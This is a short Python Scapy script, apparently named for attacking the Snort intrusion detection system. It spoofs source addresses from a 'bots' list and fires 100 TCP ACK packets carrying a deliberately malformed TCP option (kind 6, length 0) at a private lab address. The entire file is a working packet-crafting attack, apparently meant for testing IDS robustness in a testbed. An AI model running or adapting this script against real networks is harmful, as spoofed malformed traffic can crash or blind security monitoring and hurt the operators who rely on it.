from scapy.all import *
import random, time, ipaddress

# TCP Snort
TARGET_IP   = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE     = "../bots.txt"
IFACE       = "enp0s3"
PKTS_TOTAL  = 100


def load_bots(file):
    bots = []
    with open(file) as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bots.append(ip)
    return bots

def run_tcp_snort():
    bots  = load_bots(BOTFILE)
    pkts  = []

    for _ in range(PKTS_TOTAL):
        src_ip = random.choice(bots)
        ip  = IP(src=src_ip, dst=TARGET_IP)
        # TCP Option: 06 00 ff ff
        tcp = TCP(
            sport=RandShort(), dport=TARGET_PORT,
            flags='A', seq=random.randint(0, 0xFFFFFFFF),
            window=8192,
            options=[(6, b'\x00\xff\xff')]   # Kind 6, len 0, data 0xff 0xff (malformed!)
        )
        pkts.append(Ether() / ip / tcp)

    t0 = time.perf_counter()
    sendpfast(pkts, iface=IFACE, file_cache=True)
    print(f"Total time to send packets: {time.perf_counter()-t0:.4f}s.")

if __name__ == "__main__":
    run_tcp_snort()


# sudo PYTHONPATH=$HOME/scapy python3 tcp_snort_06.py